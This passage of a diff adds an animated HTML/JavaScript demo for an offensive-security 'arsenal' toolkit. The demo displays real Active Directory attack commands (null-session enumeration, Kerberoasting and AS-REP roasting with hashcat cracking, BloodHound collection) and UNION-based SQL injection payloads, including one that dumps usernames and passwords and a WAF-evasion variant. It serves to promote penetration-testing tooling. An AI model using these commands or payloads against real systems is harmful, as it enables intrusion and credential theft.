+                  <button class="d-opt">📡 VPN</button>
+                  <button class="d-opt">↪ Pivoted</button>
+                </div>
+              </div>
+              <div class="d-node locked" id="dn2">
+                <div style="margin-bottom:6px;"><span class="d-ax">B</span><span style="font:.58rem/1 var(--mono);color:var(--text3);">Identity</span></div>
+                <div class="d-q">What identity do you have?</div>
+                <div class="d-opts">
+                  <button class="d-opt">❌ None</button>
+                  <button class="d-opt" id="dn2-du">👤 Domain User</button>
+                  <button class="d-opt">🏠 Local User</button>
+                </div>
+              </div>
+              <div class="d-node locked" id="dn3">
+                <div style="margin-bottom:6px;"><span class="d-ax">C</span><span style="font:.58rem/1 var(--mono);color:var(--text3);">Credentials</span></div>
+                <div class="d-q">What credential form?</div>
+                <div class="d-opts">
+                  <button class="d-opt" id="dn3-pw">🔑 Password</button>
+                  <button class="d-opt">💾 NTLM Hash</button>
+                  <button class="d-opt">🎟 TGT</button>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="ab-panel">
+            <div class="ab-ph"><span style="font-size:.78rem">⚙️</span><h2>Configuration</h2></div>
+            <div class="ab-pb">
+              <div class="cfg-grid">
+                <div class="cfg-f"><label>LHOST</label><input class="c-inp" id="c-lh" placeholder="10.10.14.x"></div>
+                <div class="cfg-f"><label>LPORT</label><input class="c-inp" placeholder="4444" value="4444"></div>
+                <div class="cfg-f"><label>DC IP</label><input class="c-inp" id="c-dc" placeholder="10.10.11.x"></div>
+                <div class="cfg-f"><label>DOMAIN</label><input class="c-inp" placeholder="corp.local" value="corp.local"></div>
+                <div class="cfg-f"><label>USERNAME</label><input class="c-inp" id="c-us" placeholder="user"></div>
+                <div class="cfg-f"><label>PASSWORD</label><input class="c-inp" id="c-pw" placeholder="Pass@123"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="ab-main">
+          <div class="ph-tabs">
+            <button class="ptab act">🔍 Reconnaissance<span class="pcnt">13</span></button>
+            <button class="ptab">📋 Enumeration<span class="pcnt">128</span></button>
+            <button class="ptab">🔑 Credential Access<span class="pcnt">118</span></button>
+            <button class="ptab">⬆ Privilege Escalation<span class="pcnt">64</span></button>
+            <button class="ptab">↔ Lateral Movement<span class="pcnt">58</span></button>
+          </div>
+          <div class="cmd-scroll">
+            <div class="cmd-card stealthy"><div class="ch"><div><div class="ct">SMB Null Session Enum</div><div class="cid">RECON_001</div></div><div class="cbadges"><span class="cb os-b">BOTH</span><span class="cb n-low">LOW</span></div></div><div class="cd-t">Enumerate shares and null sessions via SMB — no credentials needed</div><div class="cmd-box"><div class="cmd-txt">nxc smb <span class="v" id="v1">DC_IP</span> -u '' -p '' --shares</div></div><button class="copy-btn" id="cb1">📋 Copy Ready Command</button></div>
+            <div class="cmd-card stealthy"><div class="ch"><div><div class="ct">LDAP Enumeration (Auth)</div><div class="cid">ENUM_001</div></div><div class="cbadges"><span class="cb os-b">BOTH</span><span class="cb n-med">MEDIUM</span></div></div><div class="cd-t">Full LDAP enumeration — all users, groups, GPOs, password policies</div><div class="cmd-box"><div class="cmd-txt">nxc ldap <span class="v" id="v2">DC_IP</span> -u <span class="v" id="v3">USERNAME</span> -p <span class="v" id="v4">PASSWORD</span> --users --groups --gpos</div></div><button class="copy-btn" id="cb2">📋 Copy Ready Command</button></div>
+            <div class="cmd-card noisy"><div class="ch"><div><div class="ct">Kerberoasting</div><div class="cid">CRED_001</div></div><div class="cbadges"><span class="cb os-b">BOTH</span><span class="cb n-hi">HIGH</span></div></div><div class="cd-t">Request service tickets for SPNs — crack hashes offline with hashcat</div><div class="cmd-box"><div class="cmd-txt">nxc ldap <span class="v" id="v5">DC_IP</span> -u <span class="v" id="v6">USERNAME</span> -p <span class="v" id="v7">PASSWORD</span> --kerberoast kerberoast.txt
+
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt</div></div><button class="copy-btn" id="cb3">📋 Copy Ready Command</button></div>
+            <div class="cmd-card stealthy"><div class="ch"><div><div class="ct">BloodHound Collection</div><div class="cid">ENUM_007</div></div><div class="cbadges"><span class="cb os-b">BOTH</span><span class="cb n-med">MEDIUM</span></div></div><div class="cd-t">Collect full AD graph for BloodHound — attack path analysis</div><div class="cmd-box"><div class="cmd-txt">nxc ldap <span class="v" id="v8">DC_IP</span> -u <span class="v" id="v9">USERNAME</span> -p <span class="v" id="v10">PASSWORD</span> --bloodhound -ns <span class="v" id="v11">DC_IP</span> -c All</div></div><button class="copy-btn" id="cb4">📋 Copy Ready Command</button></div>
+            <div class="cmd-card moderate"><div class="ch"><div><div class="ct">AS-REP Roasting</div><div class="cid">CRED_002</div></div><div class="cbadges"><span class="cb os-b">BOTH</span><span class="cb n-med">MEDIUM</span></div></div><div class="cd-t">Target accounts with Kerberos pre-auth disabled — no creds needed</div><div class="cmd-box"><div class="cmd-txt">nxc ldap <span class="v" id="v12">DC_IP</span> -u '' -p '' --asreproast asrep.txt
+
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt</div></div><button class="copy-btn" id="cb5">📋 Copy Ready Command</button></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ S3: SQLi OPERATOR ══ -->
+    <div class="scene" id="s3">
+      <div class="sq-hdr">
+        <div>
+          <div class="sq-title">💉 SQL Injection Operator</div>
+          <div style="font:.58rem/1 var(--sans);color:var(--text3);margin-top:2px;">BY @MAHDIESTA</div>
+        </div>
+        <div class="sq-pill-row">
+          <div class="sq-hpill"><b>1,000+</b> Payloads</div>
+          <div class="sq-hpill"><b>10+</b> Generators</div>
+          <div class="sq-hpill"><b>WAF</b> Bypass</div>
+          <div class="sq-hpill"><b>sqlmap</b> Builder</div>
+        </div>
+      </div>
+      <div class="sq-body">
+        <div class="sq-side">
+          <div class="sq-sect">Attack Type</div>
+          <div class="sq-types">
+            <button class="sq-type" id="sqt-union">⚡ UNION BASED</button>
+            <button class="sq-type" id="sqt-blind">🕵 BLIND / TIME</button>
+            <button class="sq-type" id="sqt-oob">📡 OOB / DNS</button>
+            <button class="sq-type" id="sqt-stk">📦 STACKED</button>
+            <button class="sq-type" id="sqt-err">❌ ERROR BASED</button>
+          </div>
+          <div class="sq-sect">Target URL</div>
+          <input class="sq-inp" id="sq-url" placeholder="http://target.com/page?id=1">
+          <div class="sq-sect">WAF Bypass</div>
+          <div class="sq-waf-row">
+            <button class="sq-tog" id="sq-waf1">Space → /**/</button>
+            <button class="sq-tog" id="sq-waf2">URL Encoding</button>
+            <button class="sq-tog" id="sq-waf3">Case Mixing</button>
+          </div>
+          <button class="sq-gen" id="sq-gen">⚡ Generate Payloads</button>
+          <div class="sq-meta">
+            <div class="sq-mrow"><span>DB Engine</span><span>MySQL</span></div>
+            <div class="sq-mrow"><span>Columns</span><span>Auto-detect</span></div>
+            <div class="sq-mrow"><span>WAF Active</span><span id="sq-waf-st" style="color:var(--text3)">No</span></div>
+          </div>
+        </div>
+        <div class="sq-main">
+          <div class="sq-toolbar">
+            <div><span class="sq-cnt" id="sq-cnt">0 payloads</span><span class="sq-ttag" id="sq-ttag">SELECT TYPE</span></div>
+            <button class="sq-copy-all" id="sq-copy-all">📋 Copy All</button>
+          </div>
+          <div class="sq-payloads" id="sq-payloads">
+            <div class="sq-empty">← Select attack type, configure target, then Generate</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── S4: PrivEsc Toolkit — real page via iframe ── -->
+    <div class="scene" id="s4">
+      <iframe id="px-iframe"
+        src="http://localhost:8766/privesc/privesc-toolkit.html"
+        style="width:100%;height:100%;border:none;display:block;"
+        onload="ifrLoaded(this)"></iframe>
+    </div>
+
+    </div><!-- /zoomWrap -->
+  </div><!-- /vp -->
+
+  <div id="cursorLayer">
+    <div id="cur"><svg viewBox="0 0 20 20" fill="none"><path d="M3 1.5L17 10L9.5 12L7 18.5L3 1.5Z" fill="#00d4ff" stroke="rgba(255,255,255,.6)" stroke-width=".8"/></svg></div>
+    <div id="curRing"></div>
+  </div>
+  <div id="scan"></div>
+  <div id="flash"></div>
+  <div id="toast">✓ COMMAND COPIED!</div>
+  <div id="prog"></div>
+  <div id="keyBadge"></div>
+  <div id="rec"><div class="rdot"></div>REC</div>
+</div>
+
+<script>
+const stage = document.getElementById('stage');
+const vp    = document.getElementById('vp');
+const zw    = document.getElementById('zoomWrap');
+const cur   = document.getElementById('cur');
+const ring  = document.getElementById('curRing');
+const prog  = document.getElementById('prog');
+const badge = document.getElementById('keyBadge');
+const flash = document.getElementById('flash');
+const toast = document.getElementById('toast');
+const wait  = ms => new Promise(r => setTimeout(r, ms));
+let isDark  = true;
+
+function moveCursor(x, y, dur=500) {
+  cur.style.transition  = `transform ${dur}ms cubic-bezier(.25,.1,.25,1)`;
+  ring.style.transition = `transform ${dur+80}ms cubic-bezier(.25,.1,.25,1),width .25s,height .25s,border-color .25s`;
+  cur.style.transform   = `translate(${x}px,${y}px)`;
+  ring.style.transform  = `translate(${x}px,${y}px)`;
+  return wait(dur);
+}
+
+async function goto(elOrSel, dx=0, dy=0, dur=480) {
+  const el = typeof elOrSel === 'string' ? document.querySelector(elOrSel) : elOrSel;
+  if (!el) return;
+  const er = el.getBoundingClientRect(), sr = stage.getBoundingClientRect();
+  return moveCursor(er.left - sr.left + er.width/2 + dx, er.top - sr.top + er.height/2 + dy, dur);
+}
+
+function hoverOn()  { ring.classList.add('hover'); }
+function hoverOff() { ring.classList.remove('hover'); }
+
+function doClick(x, y) {
+  const r = document.createElement('div');
+  r.className = 'ripple'; r.style.left = x+'px'; r.style.top = y+'px';
+  stage.appendChild(r); setTimeout(() => r.remove(), 500);
+}
+
+async function clickEl(elOrSel, dx=0, dy=0, moveDur=450) {
+  const el = typeof elOrSel === 'string' ? document.querySelector(elOrSel) : elOrSel;
+  if (!el) return;
+  const er = el.getBoundingClientRect(), sr = stage.getBoundingClientRect();
+  const x = er.left - sr.left + er.width/2 + dx;
+  const y = er.top  - sr.top  + er.height/2 + dy;
+  await moveCursor(x, y, moveDur);
+  await wait(55);
+  doClick(x, y);
+  cur.style.transition = 'transform .08s';
+  cur.style.transform  = `translate(${x}px,${y}px) scale(.82)`;
+  await wait(85);
+  cur.style.transition = 'transform .15s';
+  cur.style.transform  = `translate(${x}px,${y}px) scale(1)`;
+  await wait(90);
+}
+
+function setProgress(p) { prog.style.width = p + '%'; }
+
+function showKey(k, dur=700) {
+  badge.textContent = k;
+  badge.classList.add('show');
+  setTimeout(() => badge.classList.remove('show'), dur);
+}
+
+function toggleTheme() {
+  isDark = !isDark;
+  const d = isDark;
+  document.documentElement.style.setProperty('--bg',    d?'#050508':'#f8fafc');
+  document.documentElement.style.setProperty('--bg2',   d?'#0a0a10':'#ffffff');
+  document.documentElement.style.setProperty('--bg3',   d?'#111118':'#f1f5f9');
+  document.documentElement.style.setProperty('--bg4',   d?'#1a1a28':'#e2e8f0');
+  document.documentElement.style.setProperty('--text',  d?'#f0f0f5':'#0f172a');
+  document.documentElement.style.setProperty('--text2', d?'#8888a0':'#475569');
+  document.documentElement.style.setProperty('--text3', d?'#444460':'#94a3b8');
+  document.documentElement.style.setProperty('--brd',   d?'#252535':'#e2e8f0');
+  document.documentElement.style.setProperty('--brd2',  d?'#353548':'#cbd5e1');
+  document.getElementById('modeTag').textContent = d ? 'DARK' : 'LIGHT';
+  document.getElementById('modeTag').style.color = d ? 'var(--red)' : '#0891b2';
+  flash.classList.add('on'); setTimeout(() => flash.classList.remove('on'), 260);
+}
+
+function showScene(id) {
+  document.querySelectorAll('.scene').forEach(s => s.classList.remove('active'));
+  const s = document.getElementById(id); if (s) s.classList.add('active');
+}
+
+function zoomTo(elOrSel, scale=1.35, dur=550) {
+  const el = typeof elOrSel === 'string' ? document.querySelector(elOrSel) : elOrSel;
+  if (!el) return;
+  const er = el.getBoundingClientRect(), vr = vp.getBoundingClientRect();
+  const ex = er.left - vr.left + er.width/2;
+  const ey = er.top  - vr.top  + er.height/2;
+  const tx = 640/scale - ex, ty = 342/scale - ey;
+  zw.style.transition = `transform ${dur}ms cubic-bezier(.25,.1,.25,1)`;
+  zw.style.transformOrigin = '0 0';
+  zw.style.transform = `scale(${scale}) translate(${tx}px,${ty}px)`;
+}
+
+function resetZoom(dur=500) {
+  zw.style.transition = `transform ${dur}ms cubic-bezier(.25,.1,.25,1)`;
+  zw.style.transformOrigin = 'center center';
+  zw.style.transform = 'scale(1) translate(0,0)';
+}
+
+/* ── iframe helpers (same-origin privesc toolkit) ── */
+function ifrLoaded(ifr) {
+  try {
+    const s = ifr.contentDocument.createElement('style');
+    s.textContent = '*,*::before,*::after{cursor:none!important}';
+    ifr.contentDocument.head.appendChild(s);
+  } catch(e) {}
+}
+
+function _ifr() { return document.getElementById('px-iframe'); }
+function _ifrEl(sel) {
+  try { return _ifr().contentDocument.querySelector(sel); } catch(e) { return null; }
+}
+
+async function gotoIfr(sel, dx=0, dy=0, dur=480) {
+  const ifr=_ifr(), el=_ifrEl(sel);
+  if(!el) return wait(dur);
+  const er=el.getBoundingClientRect(), ir=ifr.getBoundingClientRect(), sr=stage.getBoundingClientRect();
+  return moveCursor(ir.left-sr.left+er.left+er.width/2+dx, ir.top-sr.top+er.top+er.height/2+dy, dur);
+}
+
+async function clickIfr(sel, dx=0, dy=0, moveDur=430) {
+  const ifr=_ifr(), el=_ifrEl(sel);
+  if(!el) return wait(moveDur+220);
+  const er=el.getBoundingClientRect(), ir=ifr.getBoundingClientRect(), sr=stage.getBoundingClientRect();
+  const x=ir.left-sr.left+er.left+er.width/2+dx, y=ir.top-sr.top+er.top+er.height/2+dy;
+  await moveCursor(x, y, moveDur); await wait(50);
+  doClick(x, y);
+  cur.style.transition='transform .08s'; cur.style.transform=`translate(${x}px,${y}px) scale(.82)`;
+  await wait(80);
+  cur.style.transition='transform .15s'; cur.style.transform=`translate(${x}px,${y}px) scale(1)`;
+  await wait(80);
+  el.click();
+}
+
+async function typeIfr(sel, str, speed=70) {
+  const el=_ifrEl(sel);
+  if(!el) return wait(str.length * speed);
+  el.value=''; el.focus();
+  for(const ch of str){ el.value+=ch; el.dispatchEvent(new Event('input',{bubbles:true})); await wait(speed+Math.random()*16-8); }
+}
+
+function setFilter(btnId, cat) {
+  document.querySelectorAll('.fb').forEach(b => b.classList.remove('on'));
+  const btn = document.getElementById(btnId); if (btn) btn.classList.add('on');
+  document.querySelectorAll('.card').forEach(c => {
+    if (cat === 'all' || c.dataset.cat === cat) c.classList.remove('dim');
+    else c.classList.add('dim');
+  });
+}
+
+async function countUp(id, target, dur=900) {
+  const el = document.getElementById(id);
+  let v = 0; const step = target / 45;
+  const iv = setInterval(() => {
+    v = Math.min(v + step, target);
+    el.textContent = Math.round(v).toLocaleString();
+    if (v >= target) { el.textContent = target.toLocaleString(); clearInterval(iv); }
+  }, dur / 45);
+}
+
+const srData = [
+  { label:'Active Directory Boom', tag:'ad',  cmd:'nxc smb DC_IP -u USER -p PASS --shares' },
+  { label:'NetExec Guide',         tag:'nxc', cmd:'nxc smb DC_IP -u USER -p PASS --users' },
+  { label:'BloodHound Cheat Sheet',tag:'ad',  cmd:'nxc ldap DC_IP -u USER -p PASS --bloodhound -c All' },
+  { label:'ADCS Reference',        tag:'adcs',cmd:'certipy find -u USER@corp -p PASS -dc-ip DC_IP' },
+  { label:'bloodyAD Arsenal',      tag:'ad',  cmd:'bloodyAD -u USER -p PASS --host DC_IP get object DC' },
+];
+
+function renderSearch(term) {
+  if (!term) { document.getElementById('srPanel').style.display='none'; return; }
+  document.getElementById('srPanel').style.display = 'block';
+  document.getElementById('srHdr').textContent = srData.length + ' results for "' + term + '"';
+  document.getElementById('srChips').innerHTML = srData.map((d,i) =>
+    `<span class="sr-chip${i<2?' hl':''}"><span class="sr-tag">${d.tag}</span><span style="font:.7rem/1 var(--sans);font-weight:600;color:var(--text)">${d.label}</span><span class="sr-code">${d.cmd}</span></span>`
+  ).join('');
+}
+
+function clearSearch() {
+  const sb = document.getElementById('srchBox');
+  sb.value = ''; sb.classList.remove('lit');
+  document.getElementById('srPanel').style.display = 'none';
+}
+
+function varWave() {
+  document.querySelectorAll('#s2 .v').forEach((v,i) => {
+    setTimeout(() => { v.classList.add('hi'); setTimeout(() => v.classList.remove('hi'), 700); }, i*50);
+  });
+}
+
+function setVars(dc, user, pass) {
+  const m = {v1:dc,v2:dc,v3:user,v4:pass,v5:dc,v6:user,v7:pass,v8:dc,v9:user,v10:pass,v11:dc,v12:dc};
+  for (const [id,val] of Object.entries(m)) { const e=document.getElementById(id); if(e&&val) e.textContent=val; }
+}
+
+async function typeInp(el, str, speed=78) {
+  el.value = ''; if(el.focus) el.focus();
+  for (const ch of str) { el.value += ch; await wait(speed + Math.random()*18-9); }
+  el.classList.add('filled');
+}
+
+async function typeSearch(str) {
+  const sb = document.getElementById('srchBox');
+  sb.value = ''; sb.classList.add('lit');
+  for (const ch of str) { sb.value += ch; renderSearch(sb.value); await wait(105+Math.random()*30-15); }
+}
+
+async function animateReady(target) {
+  const el = document.getElementById('rc');
+  let v = 0; el.style.color='var(--yellow)';
+  const iv = setInterval(() => { v=Math.min(v+3,target); el.textContent=v; if(v>=target){clearInterval(iv);el.style.color='var(--green)';} }, 22);
+  await wait(1300);
+}
+
+function copyFx(btnEl, msg='✓ COMMAND COPIED!') {
+  btnEl.textContent = '✓ COPIED!'; btnEl.classList.add('copied');
+  toast.textContent = msg; toast.classList.add('show');
+  setTimeout(() => { btnEl.textContent='📋 Copy Ready Command'; btnEl.classList.remove('copied'); }, 1400);
+  setTimeout(() => toast.classList.remove('show'), 1800);
+}
+
+/* ═══════════════════════════════
+   MAIN TIMELINE — ~52s loop
+═══════════════════════════════ */
+async function run() {
+  // ── RESET ──
+  showScene('s1');
+  setFilter('fa','all');
+  clearSearch();
+  document.getElementById('heroCmd').textContent = '';
+  document.getElementById('sc1').textContent = '0';
+  document.getElementById('sc2').textContent = '0';
+  ['dn1','dn2','dn3'].forEach(id => {
+    const n=document.getElementById(id);
+    if(n) n.className = id==='dn1'?'d-node active':'d-node locked';
+  });
+  ['dn1-int','dn2-du','dn3-pw'].forEach(id => { const e=document.getElementById(id); if(e) e.classList.remove('sel'); });
+  ['sv-ac','sv-id','sv-cr','sv-lh','sv-dc'].forEach(id => { const e=document.getElementById(id); if(e){e.textContent='Not set';e.classList.add('unset');} });
+  ['c-lh','c-dc','c-us','c-pw'].forEach(id => { const e=document.getElementById(id); if(e){e.value='';e.classList.remove('filled');} });
+  document.getElementById('rc').textContent='0'; document.getElementById('rc').style.color='var(--yellow)';
+  ['v1','v2','v5','v8','v11','v12'].forEach(id=>{const e=document.getElementById(id);if(e)e.textContent='DC_IP';});
+  ['v3','v6','v9'].forEach(id=>{const e=document.getElementById(id);if(e)e.textContent='USERNAME';});
+  ['v4','v7','v10'].forEach(id=>{const e=document.getElementById(id);if(e)e.textContent='PASSWORD';});
+  if(!isDark){isDark=true;toggleTheme();isDark=true;}
+  document.getElementById('modeTag').textContent='DARK';
+  document.getElementById('urlText').textContent='mahdiesta-arsenal / index.html';
+  cur.style.transition='none'; cur.style.transform='translate(-9999px,-9999px)';
+  ring.style.transition='none'; ring.style.transform='translate(-9999px,-9999px)';
+  setProgress(0);
+  await wait(80);
+
+  /* ── 1. TERMINAL (0-2.5s) ── */
+  const hc = document.getElementById('heroCmd');
+  for (const ch of ' ./arsenal --start') { hc.textContent+=ch; await wait(55+Math.random()*22-11); }
+  await wait(180);
+  countUp('sc1',1458,900);
+  countUp('sc2',14,500);
+  setProgress(7);
+  await wait(1100);
+
+  /* ── 2. THEME TOGGLE (2.5-6s) ── */
+  const tbR=document.getElementById('tBtn').getBoundingClientRect();
+  const stR=stage.getBoundingClientRect();
+  const tbx=tbR.left-stR.left+tbR.width/2, tby=tbR.top-stR.top+tbR.height/2;
+  cur.style.transform=`translate(${tbx}px,${tby-80}px)`;
+  ring.style.transform=`translate(${tbx}px,${tby-80}px)`;
+  await wait(40);
+  await moveCursor(tbx, tby, 580);
+  hoverOn(); await wait(320);
+  await clickEl('#tBtn',0,0,0); hoverOff();
+  showKey('T'); toggleTheme();
+  setProgress(14);
+  await wait(950);
+  hoverOn(); await wait(160);
+  await clickEl('#tBtn',0,0,160); hoverOff();
+  showKey('T'); toggleTheme();
+  setProgress(20);
+  await wait(700);
+
+  /* ── 3. SEARCH (6-10s) ── */
+  showKey('/');
+  await clickEl('#srchBox',0,0,480);
+  await wait(180);
+  await typeSearch('nxc');
+  const chip0=document.querySelector('#srChips .sr-chip');
+  if(chip0) await goto(chip0,0,0,380);
+  hoverOn(); await wait(750); hoverOff();
+  for(const ch of ' smb'){document.getElementById('srchBox').value+=ch;renderSearch(document.getElementById('srchBox').value);await wait(105);}
+  await wait(480);
+  showKey('ESC'); clearSearch();
+  setProgress(35);
+  await wait(380);
+
+  /* ── 4. FILTER CYCLE — AD spotlight, then SQL spotlight (10-14.5s) ── */
+  await clickEl('#fad',0,0,400); setFilter('fad','ad');
+  await goto('#cAD',0,0,400); hoverOn();
+  document.getElementById('cAD').classList.add('spot');
+  await wait(700);
+  document.getElementById('cAD').classList.remove('spot'); hoverOff();
+  setProgress(42);
+
+  await clickEl('#fsq',0,0,350); setFilter('fsq','sql');
+  await goto('#cSQLI',0,0,380); hoverOn();
+  document.getElementById('cSQLI').classList.add('spot');
+  await wait(600);
+  document.getElementById('cSQLI').classList.remove('spot'); hoverOff();
+
+  await clickEl('#fwb',0,0,320); setFilter('fwb','web'); await wait(380);
+  await clickEl('#fa',0,0,300); setFilter('fa','all');
+  setProgress(48);
+  await wait(280);
+
+  /* ── 5. ENTER ADBOOM (14.5-16.5s) ── */
+  await clickEl('#cAD',0,0,400);
+  document.getElementById('cAD').classList.add('spot'); await wait(260);
+  document.getElementById('cAD').classList.remove('spot');
+  document.getElementById('urlText').textContent='mahdiesta-arsenal / ad-boom.html';
+  showScene('s2');
+  setProgress(55);
+  await wait(800);
+
+  /* ── 6. DECISION TREE (16.5-24.5s) ── */
+  await goto('#dn1-int',0,0,520); hoverOn(); await wait(280);
+  await clickEl('#dn1-int',0,0,0); hoverOff();
+  document.getElementById('dn1-int').classList.add('sel');
+  document.getElementById('dn1').className='d-node done';
+  document.getElementById('dn2').className='d-node active';
+  const svAc=document.getElementById('sv-ac'); svAc.textContent='Internal (Auth)'; svAc.classList.remove('unset');
+  setProgress(60);
+  await wait(680);
+
+  await goto('#dn2-du',0,0,500); hoverOn(); await wait(240);
+  await clickEl('#dn2-du',0,0,0); hoverOff();
+  document.getElementById('dn2-du').classList.add('sel');
+  document.getElementById('dn2').className='d-node done';
+  document.getElementById('dn3').className='d-node active';
+  const svId=document.getElementById('sv-id'); svId.textContent='Domain User'; svId.classList.remove('unset');
+  setProgress(65);
+  await wait(680);
+
+  await goto('#dn3-pw',0,0,470); hoverOn(); await wait(220);
+  await clickEl('#dn3-pw',0,0,0); hoverOff();
+  document.getElementById('dn3-pw').classList.add('sel');
+  document.getElementById('dn3').className='d-node done';
+  const svCr=document.getElementById('sv-cr'); svCr.textContent='Password'; svCr.classList.remove('unset');
+  animateReady(146);
+  setProgress(70);
+  await wait(800);
+
+  /* ── 7. TYPE IPs + VAR WAVE (24.5-29s) ── */
+  const lhEl=document.getElementById('c-lh');
+  await goto(lhEl,0,0,460); await clickEl(lhEl,0,0,0); await wait(160);
+  await typeInp(lhEl,'10.10.14.52',80);
+  const svLh=document.getElementById('sv-lh'); svLh.textContent='10.10.14.52'; svLh.classList.remove('unset');
+  setProgress(76);
+  await wait(380);
+
+  const dcEl=document.getElementById('c-dc');
+  await goto(dcEl,0,0,400); await clickEl(dcEl,0,0,0); await wait(140);
+  await typeInp(dcEl,'10.10.11.147',75);
+  const svDc=document.getElementById('sv-dc'); svDc.textContent='10.10.11.147'; svDc.classList.remove('unset');
+  setVars('10.10.11.147','mahdiesta','P@ssw0rd!');
+  varWave();
+  setProgress(80);
+  await wait(900);
+
+  /* ── 8. COPY KERBEROASTING (29-32.5s) ── */
+  const cb3=document.getElementById('cb3');
+  await goto(cb3,0,0,500); hoverOn(); await wait(300);
+  await clickEl(cb3,0,0,0); hoverOff();
+  copyFx(cb3,'✓ COMMAND COPIED!');
+  setProgress(84);
+  await wait(1800);
+
+  /* ── 9. SQLi OPERATOR SCENE (32.5-43s) ── */
+  document.getElementById('urlText').textContent='mahdiesta-arsenal / sqli-operator.html';
+  // Reset s3 state
+  document.getElementById('sq-payloads').innerHTML='<div class="sq-empty">← Select attack type, configure target, then Generate</div>';
+  document.getElementById('sq-cnt').textContent='0 payloads';
+  document.getElementById('sq-ttag').textContent='SELECT TYPE';
+  document.querySelectorAll('.sq-type').forEach(b=>b.classList.remove('act'));
+  document.querySelectorAll('.sq-tog').forEach(b=>b.classList.remove('on'));
+  const sqU=document.getElementById('sq-url'); sqU.value=''; sqU.classList.remove('filled');
+  document.getElementById('sq-waf-st').textContent='No'; document.getElementById('sq-waf-st').style.color='var(--text3)';
+  showScene('s3');
+  await wait(580);
+
+  // Select UNION BASED
+  await clickEl('#sqt-union',0,0,420);
+  document.getElementById('sqt-union').classList.add('act');
+  document.getElementById('sq-ttag').textContent='UNION BASED';
+  await wait(320);
+
+  // Type URL
+  await clickEl(sqU,0,0,380);
+  await typeInp(sqU,'target.com/login?id=1',60);
+  await wait(230);
+
+  // WAF bypass
+  await clickEl('#sq-waf1',0,0,360);
+  document.getElementById('sq-waf1').classList.add('on');
+  document.getElementById('sq-waf-st').textContent='Yes';
+  document.getElementById('sq-waf-st').style.color='var(--green)';
+  setProgress(86);
+  await wait(300);
+
+  // Generate
+  await clickEl('#sq-gen',0,0,350);
+  await wait(160);
+
+  // Payloads appear
+  const pls = [
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL--",
+    "' UNION SELECT @@version,user(),database()--",
+    "1 UNION ALL SELECT table_name,2,3 FROM information_schema.tables--",
+    "' UNION SELECT username,password,3 FROM users--",
+    "1'/**/UNION/**/SELECT/**/1,group_concat(table_name),3/**/FROM/**/information_schema.tables--",
+  ];
+  const pCon=document.getElementById('sq-payloads');
+  pCon.innerHTML='';
+  for(let i=0;i<pls.length;i++){
+    const item=document.createElement('div');
+    item.className='sq-item';
+    item.innerHTML=`<span class="sq-code">${pls[i]}</span><button class="sq-icopy">📋</button>`;
+    pCon.appendChild(item);
+    await wait(35); item.classList.add('show');
+    document.getElementById('sq-cnt').textContent=(i+1)+' payloads';
+    await wait(290);
+  }
+  setProgress(90);
+  await wait(350);
+
+  // Hover 4th payload
+  const sqItems=pCon.querySelectorAll('.sq-item');
+  if(sqItems[3]){await goto(sqItems[3],0,0,380);hoverOn();await wait(480);hoverOff();}
+
+  // Copy All
+  await clickEl('#sq-copy-all',0,0,420);
+  toast.textContent='✓ ALL PAYLOADS COPIED!';
+  toast.classList.add('show');
+  setProgress(92);
+  await wait(1500);
+  toast.classList.remove('show');
+  toast.textContent='✓ COMMAND COPIED!';
+  await wait(320);
+
+  /* ── 10. PRIVESC TOOLKIT SCENE (~41-58s) ── */
+  document.getElementById('urlText').textContent='mahdiesta-arsenal / privesc / privesc-toolkit.html';
+
+  // Reset iframe: Windows mode, dark theme, clear all inputs
+  try {
+    const piw=_ifr().contentWindow;
+    if(_ifr().contentDocument.body.classList.contains('theme-light')) piw.toggleTheme();
+    if(_ifr().contentDocument.body.classList.contains('os-lin')) piw.setOS('win');
+    ['v-kali','v-port','v-wpath','v-rport','v-target','v-user','v-pass','search-box'].forEach(id=>{
+      const el=_ifrEl('#'+id); if(el){el.value='';el.dispatchEvent(new Event('input',{bubbles:true}));}
+    });
+  } catch(e) {}
+
+  showScene('s4');
+  setProgress(93);
+  await wait(800);
+
+  /* — Fill KALI_IP — */
+  await gotoIfr('#v-kali',0,0,400);
+  await clickIfr('#v-kali',0,0,230);
+  await typeIfr('#v-kali','10.10.14.52',68);
+  await wait(240);
+
+  /* — Fill PORT — */
+  await gotoIfr('#v-port',0,0,340);
+  await clickIfr('#v-port',0,0,210);
+  await typeIfr('#v-port','8080',72);
+  await wait(240);
+
+  /* — Fill WPATH (Windows-only varbar field) — */
+  await gotoIfr('#v-wpath',0,0,350);
+  await clickIfr('#v-wpath',0,0,220);
+  await typeIfr('#v-wpath','C:\\Temp',65);
+  await wait(280);
+  setProgress(95);
+
+  /* — Theme toggle (T shortcut) — dark → light → dark — */
+  await gotoIfr('button[title="Toggle dark/light"]',0,0,400);
+  await wait(140);
+  await clickIfr('button[title="Toggle dark/light"]',0,0,0);
+  await wait(750);
+  await gotoIfr('button[title="Toggle dark/light"]',0,0,310);
+  await clickIfr('button[title="Toggle dark/light"]',0,0,0);
+  await wait(360);
+
+  /* — OS toggle: Windows → Linux (WPATH hides, LFILE appears) — */
+  await gotoIfr('#btn-lin',0,0,380);
+  await clickIfr('#btn-lin',0,0,0);
+  await wait(750);
+
+  /* — OS toggle: Linux → Windows — */
+  await gotoIfr('#btn-win',0,0,360);
+  await clickIfr('#btn-win',0,0,0);
+  await wait(380);
+  setProgress(97);
+
+  /* — Search "powerup.ps1" — */
+  await gotoIfr('#search-box',0,0,400);
+  await clickIfr('#search-box',0,0,0);
+  await typeIfr('#search-box','powerup.ps1',68);
+  await wait(950);
+
+  // Clear search
+  try{ const sb=_ifrEl('#search-box'); if(sb){sb.value='';sb.dispatchEvent(new Event('input',{bubbles:true}));} }catch(e){}
+  await wait(220);
+
+  /* — Open Tools modal (file transmission catalog) — */
+  await gotoIfr('button[onclick*="tools-modal"]',0,0,380);
+  await clickIfr('button[onclick*="tools-modal"]',0,0,0);
+  await wait(1000);
+
+  // Filter to "winpeas" — a Windows tool — so commands show real IP/PORT/WPATH
+  await gotoIfr('#tcat-q',0,0,350);
